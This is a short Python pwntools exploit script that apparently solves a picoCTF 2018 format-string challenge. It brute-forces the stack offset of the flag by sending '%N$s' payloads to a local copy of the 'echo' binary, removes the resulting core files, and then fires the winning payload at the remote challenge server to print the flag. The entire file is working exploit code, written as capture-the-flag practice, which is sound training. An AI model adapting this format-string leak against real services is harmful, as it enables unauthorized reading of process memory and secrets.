#!/usr/bin/python2
from pwn import *
from pwnlib.log import getLogger
import os

remote_log = getLogger("pwnlib.tubes.remote")
remote_log.setLevel("error")

elf_log = getLogger("pwnlib.tubes.process")
elf_log.setLevel("error")

def getProcess(is_remote = True):
    if is_remote:
        return remote('2018shell1.picoctf.com', 23397)
    else:
        return process('../echo')

def find_index():
    with log.progress('Trying offsets') as loger:
        for i in range(1, 60):
            loger.status("At %d" % i)
            
            # Do all the calculations locally
            p = getProcess(is_remote=False)
            p.recvuntil('> ')
            # Print the string at the i-th offset
            p.sendline('%%%d$s' % i)
            
            if 'flag' in p.recv():
                loger.success('Found at #%d' % i)
                return i
        loger.failure('Not found')

# Find the correct offset of the flag on the stack
index = find_index()

# Remove all the core files (failed runs)
for item in os.listdir('.'):
    if item.endswith(".core"):
        os.remove(item)

if index > 0:
    r = getProcess()
    r.recvuntil('> ')
    r.sendline('%%%d$s' % index)
    # Print the flag
    print(r.recv())